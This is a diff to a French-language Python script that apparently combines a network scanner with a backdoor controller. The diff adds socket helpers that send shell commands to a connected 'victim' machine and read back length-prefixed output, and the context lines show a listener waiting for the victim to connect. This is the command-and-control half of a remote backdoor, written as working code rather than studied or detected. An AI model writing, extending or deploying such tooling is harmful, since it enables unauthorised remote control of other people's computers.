@@ -3,7 +3,8 @@ import socket
 import threading
 import concurrent.futures
 import platform
-from backdoor_serveur import socket_send_command_and_receive_all_data
+
+MAX_DATA_SIZE = 1024
 
 def scan_network():
     print()
@@ -17,6 +18,37 @@ def scan_network():
         scan_victime()
     else:
         print("ERREUR: vous devez entrez un nombre entre 1 et 2")
+
+def socket_receive_all_data(socket_p, data_len):
+        current_data_len = 0
+        total_data = None
+        # print("socket_receive_all_data len:", data_len)
+        while current_data_len < data_len:
+            chunk_len = data_len - current_data_len
+            if chunk_len > MAX_DATA_SIZE:
+                chunk_len = MAX_DATA_SIZE
+            data = socket_p.recv(chunk_len)
+            # print("  len:", len(data))
+            if not data:
+                return None
+            if not total_data:
+                total_data = data
+            else:
+                total_data += data
+            current_data_len += len(data)
+            # print("  total len:", current_data_len, "/", data_len)
+        return total_data
+
+def socket_send_command_and_receive_all_data(socket_p, command):
+    if not command:  # if command == ""
+        return None
+    socket_p.sendall(command.encode())
+
+    header_data = socket_receive_all_data(socket_p, 13)
+    longeur_data = int(header_data.decode())
+
+    data_recues = socket_receive_all_data(socket_p, longeur_data)
+    return data_recues
 
 
 def init_scanner(ip, port):
@@ -57,6 +89,7 @@ def scan_victime():
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.bind((HOST_IP, HOST_PORT))
     s.listen()
+    print()
 
     print(f"Attente de connexion sur {HOST_IP}, port {HOST_PORT}...")
     connection_socket, client_address = s.accept()
